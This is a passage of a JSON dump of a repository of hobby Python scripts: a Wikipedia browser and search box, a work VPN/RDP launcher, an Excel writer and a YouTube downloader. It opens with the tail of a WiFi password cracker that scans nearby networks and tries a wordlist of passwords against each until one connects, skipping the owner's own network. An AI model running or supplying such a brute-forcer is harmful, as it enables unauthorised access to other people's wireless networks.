uploaded, you can download their own!\n'''\n \ndef getwifi(wifilist, wificount):\n    wifi = pywifi.PyWiFi () # crawled network interface cards\n    ifaces = wifi.interfaces () [0] # Get the card\n    ifaces.scan()\n    time.sleep(8)\n    bessis = ifaces.scan_results()\n    allwifilist = []\n    namelist = []\n    ssidlist = []\n    for data in bessis:\n        if data.ssid not in namelist: # remove duplicate names WIFI\n            namelist.append(data.ssid)\n            allwifilist.append((data.ssid, data.signal))\n    sorted(allwifilist, key=lambda st: st[1], reverse=True)\n    time.sleep(1)\n    n = 0\n    if len(allwifilist) != 0:\n        for item in allwifilist:\n            if (item[0] not in ssidlist) & (item[0] not in wifilist):\n                n = n + 1\n                if n <= wificount:\n                    ssidlist.append(item[0])\n    print(allwifilist)\n    return ssidlist\n \n \ndef getifaces():\n    wifi = pywifi.PyWiFi () # crawled network interface cards\n    ifaces = wifi.interfaces () [0] # Get the card\n    ifaces.disconnect () # disconnect unlimited card connection\n    return ifaces\n \n \ndef testwifi(ifaces, ssidname, password):\n    profile = pywifi.Profile () # create a wifi connection file\n    profile.ssid = ssidname # define wifissid\n    profile.auth = open(const.AUTH_ALG_OPEN) # NIC\n    profile.akm.append (const.AKM_TYPE_WPA2PSK) # wifi encryption algorithm\n    #encrypting unit \n    profile.cipher = const.CIPHER_TYPE_CCMP #\n    profile.key = password # wifi password\n    ifaces.remove_all_network_profiles () # delete all other configuration files\n    tmp_profile = ifaces.add_network_profile (profile) # load the configuration file\n    ifaces.connect (tmp_profile) # wifi connection\n    #You can connect to the inner (5) # 5 seconds time.sleep\n    if ifaces.status() == const.IFACE_CONNECTED:\n        return True\n    else:\n        return False\n \n \ndef beginwork(wifinamelist):\n    ifaces = getifaces()\n    path = r # password-8 digits .txt\n    # Path = r \"password- commonly used passwords .txt\"\n    files = open(path, 'r')\n    while True:\n        try:\n            password = files.readline()\n            password = password.strip('\\n')\n            if not password:\n                break\n            for wifiname in wifinamelist:\n                print ( \"are trying to:\" + wifiname + \",\" + password)\n                if testwifi(ifaces, wifiname, password):\n                    print ( \"Wifi account:\" + wifiname + \", Wifi password:\" + password)\n                    wifinamelist.remove(wifiname)\n                    break\n                if not wifinamelist:\n                    break\n        except:\n            continue\n    files.close()\n \n \nif __name__ == '__main__':\n    wifinames_e = [ \"\", \"Vrapile\"] # exclude wifi name does not crack\n    wifinames = getwifi(wifinames_e, 5)\n    print(wifinames)\n    beginwork(wifinames)\n    \n    \n    \n    \n    \n    \n"
        },
        {
          "name": "wiki",
          "type": "tree",
          "content": null
        },
        {
          "name": "wiki_random.py",
          "type": "blob",
          "size": 1.443359375,
          "content": "\"\"\"Author Anurag Kumar(mailto:anuragkumarak95@gmail.com)\nModule for Fetching Random Wiki Pages and asking user for opening one of them\n\nPython:\n  - 3.5\n\nRequirements:\n  - requests\n  - json\n  - webbrowser\n\nUsage:\n  - $python3 wiki_random.py\n\nenter index of article you would like to see, or 'r' for retry and 'n' for exit.\n\"\"\"\nimport requests\nimport webbrowser\n\npage_count = 10\nurl = (\n    \"https://en.wikipedia.org/w/api.php?action=query&list=random&rnnamespace=0&rnlimit=\"\n    + str(page_count)\n    + \"&format=json\"\n)\n\n\ndef load():\n    response = requests.get(url)\n    if response.ok:\n        jsonData = response.json()[\"query\"][\"random\"]\n        print(\"10 Random generted WIKI pages...\")\n        for idx, j in enumerate(jsonData):\n            print(str(idx) + \": \", j[\"title\"])\n        i = input(\n            \"Which page you want to see, enter index..[r: for retry,n: exit]?\"\n        ).lower()\n        if i == \"r\":\n            print(\"Loading randoms again...\")\n        elif i == \"n\":\n            print(\"Auf Wiedersehen!\")\n            return\n        else:\n            try:\n                jsonData[int(i)][\"id\"]\n            except Exception:\n                raise Exception(\"Wrong Input...\")\n            print(\"taking you to the browser...\")\n            webbrowser.get().open(\n                \"https://en.wikipedia.org/wiki?curid=\" + str(jsonData[int(i)][\"id\"])\n            )\n        load()\n    else:\n        response.raise_for_status()\n\n\nif __name__ == \"__main__\":\n    load()\n"
        },
        {
          "name": "wikipedia.py",
          "type": "blob",
          "size": 0.5146484375,
          "content": "import wikipedia\nfrom tkinter import *\nfrom tkinter.messagebox import showinfo\n\nwin = Tk()  # objek\nwin.title(\"WIKIPEDIA\")\nwin.geometry(\"200x70\")  # function\n\n# function\ndef search_wiki():\n    search = entry.get()\n    Hasil = wikipedia.summary(search)\n    showinfo(\"Hasil Pencarian\", Hasil)\n\n\nlabel = Label(win, text=\"Wikipedia Search :\")\nlabel.grid(row=0, column=0)\n\nentry = Entry(win)\nentry.grid(row=1, column=0)\n\nbutton = Button(win, text=\"Search\", command=search_wiki)\nbutton.grid(row=1, column=1, padx=10)\n\nwin.mainloop()\n"
        },
        {
          "name": "work_connect.py",
          "type": "blob",
          "size": 2.6572265625,
          "content": "# Script Name\t\t: work_connect.py\r\n# Author\t\t\t\t: Craig Richards\r\n# Created\t\t\t\t: 11th May 2012\r\n# Last Modified\t\t: 31st October 2012\r\n# Version\t\t\t\t: 1.1\r\n\r\n# Modifications\t\t: 1.1 - CR - Added some extra code, to check an argument is passed to the script first of all, then check it's a valid input\r\n\r\n# Description\t\t\t: This simple script loads everything I need to connect to work etc\r\n\r\nimport os  # Load the Library Module\r\nimport subprocess  # Load the Library Module\r\nimport sys  # Load the Library Module\r\nimport time  # Load the Library Module\r\n\r\ndropbox = os.getenv(\r\n    \"dropbox\"\r\n)  # Set the variable dropbox, by getting the values of the environment setting for dropbox\r\nrdpfile = \"remote\\\\workpc.rdp\"  # Set the variable logfile, using the arguments passed to create the logfile\r\nconffilename = os.path.join(\r\n    dropbox, rdpfile\r\n)  # Set the variable conffilename by joining confdir and conffile together\r\nremote = (\r\n    r\"c:\\windows\\system32\\mstsc.exe \"  # Set the variable remote with the path to mstsc\r\n)\r\n\r\ntext = \"\"\"You need to pass an argument\r\n\t-c Followed by login password to connect\r\n\t-d to disconnect\"\"\"  # Text to display if there is no argument passed or it's an invalid option - 1.2\r\n\r\nif len(sys.argv) < 2:  # Check there is at least one option passed to the script - 1.2\r\n    print(text)  # If not print the text above - 1.2\r\n    sys.exit()  # Exit the program - 1.2\r\n\r\nif (\r\n    \"-h\" in sys.argv or \"--h\" in sys.argv or \"-help\" in sys.argv or \"--help\" in sys.argv\r\n):  # Help Menu if called\r\n    print(text)  # Print the text, stored in the text variable - 1.2\r\n    sys.exit(0)  # Exit the program\r\nelse:\r\n    if sys.argv[1].lower().startswith(\"-c\"):  # If the first argument is -c then\r\n        passwd = sys.argv[\r\n            2\r\n        ]  # Set the variable passwd as the second argument passed, in this case my login password\r\n        subprocess.Popen(\r\n            (\r\n                r\"c:\\Program Files\\Checkpoint\\Endpoint Connect\\trac.exe connect -u username -p \"\r\n                + passwd\r\n            )\r\n        )\r\n        subprocess.Popen((r\"c:\\geektools\\puttycm.exe\"))\r\n        time.sleep(\r\n            15\r\n        )  # Sleep for 15 seconds, so the checkpoint software can connect before opening mstsc\r\n        subprocess.Popen([remote, conffilename])\r\n    elif (\r\n        sys.argv[1].lower().startswith(\"-d\")\r\n    ):  # If the first argument is -d then disconnect my checkpoint session.\r\n        subprocess.Popen(\r\n            (r\"c:\\Program Files\\Checkpoint\\Endpoint Connect\\trac.exe disconnect \")\r\n        )\r\n    else:\r\n        print(\r\n            \"Unknown option - \" + text\r\n        )  # If any other option is passed, then print Unknown option and the text from above - 1.2\r\n"
        },
        {
          "name": "write_excel_file.py",
          "type": "blob",
          "size": 1.080078125,
          "content": "import xlwt\r\nimport openpyxl\r\n\r\n# Workbook is created\r\nxlwt_wb = xlwt.Workbook()\r\n\r\n# add_sheet is used to create sheet.\r\nsheet1 = xlwt_wb.add_sheet(\"Sheet 1\")\r\n\r\nsheet1.write(1, 0, \"ISBT DEHRADUN\")\r\nsheet1.write(2, 0, \"SHASTRADHARA\")\r\nsheet1.write(3, 0, \"CLEMEN TOWN\")\r\nsheet1.write(4, 0, \"RAJPUR ROAD\")\r\nsheet1.write(5, 0, \"CLOCK TOWER\")\r\nsheet1.write(0, 1, \"ISBT DEHRADUN\")\r\nsheet1.write(0, 2, \"SHASTRADHARA\")\r\nsheet1.write(0, 3, \"CLEMEN TOWN\")\r\nsheet1.write(0, 4, \"RAJPUR ROAD\")\r\nsheet1.write(0, 5, \"CLOCK TOWER\")\r\n\r\nxlwt_wb.save(\"xlwt example.xls\")\r\n\r\n# Workbook is created\r\nopenpyxl_wb = openpyxl.Workbook()\r\n\r\n# create_sheet is used to create sheet.\r\nsheet1 = openpyxl_wb.create_sheet(\"Sheet 1\", index=0)\r\n\r\nsheet1.cell(1, 1, \"ISBT DEHRADUN\")\r\nsheet1.cell(2, 1, \"SHASTRADHARA\")\r\nsheet1.cell(3, 1, \"CLEMEN TOWN\")\r\nsheet1.cell(4, 1, \"RAJPUR ROAD\")\r\nsheet1.cell(5, 1, \"CLOCK TOWER\")\r\nsheet1.cell(1, 2, \"ISBT DEHRADUN\")\r\nsheet1.cell(1, 3, \"SHASTRADHARA\")\r\nsheet1.cell(1, 4, \"CLEMEN TOWN\")\r\nsheet1.cell(1, 5, \"RAJPUR ROAD\")\r\nsheet1.cell(1, 6, \"CLOCK TOWER\")\r\n\r\nopenpyxl_wb.save(\"openpyxl example.xlsx\")\r\n"
        },
        {
          "name": "youtubedownloader.py",
          "type": "blob",
          "size": 1.4697265625,
          "content": "from tkinter import *\nfrom tkinter import filedialog, messagebox\nfrom threading import Thread\nfrom pytube import YouTube\n\n\ndef threading():\n    # Call work function\n    t1 = Thread(target=download)\n    t1.start()\n\ndef download():\n    try:\n        url = YouTube(str(url_box.get()))\n        video = url.streams.first()\n        filename = filedialog.asksaveasfilename(defaultextension=\".mp4\", filetypes=[(\"MP4 files\", \"*.mp4\")])\n        if filename:  # Check if a filename is selected\n            video.download(filename=filename)\n            messagebox.showinfo('', 'Download completed!')\n        else:\n            messagebox.showwarning('', 'Download cancelled!')\n    except Exception as e:\n        messagebox.showerror(\"Error\", \"An error occurred while downloading the video.\")\n\n\n\nroot = Tk()\nroot.title('YouTube Downloader')\nroot.geometry('780x500+200+200')\nroot.configure(bg='olivedrab1')\nroot.resizable(False, False)\n\n# Label widgets\nintrolable = Label(\n    root,\n    text='YouTube Video Downloader',\n    width=30,\n    relief='ridge',\n    bd=4,\n    font=('chiller', 26, 'italic bold'),\n    fg='red')\nintrolable.place(x=35, y=20)\n\nLabel(\n    root, \n    text='Enter YouTube Link', \n    font=('sans-serif', 16), \n    bg='olivedrab1'\n    ).place(x=40, y=150)\n\nurl_box = Entry(\n    root, \n    font=('arial', 30), \n    width=30\n    )\nurl_box.place(x=40, y=180)\n\nbtn = Button(\n    root, \n    text='DOWNLOAD', \n    font=('sans-serif', 25), \n    command=threading\n    )\nbtn.place(x=270, y=240)\n\nroot.mainloop()\n"
        }
      ]
    }
  ]
}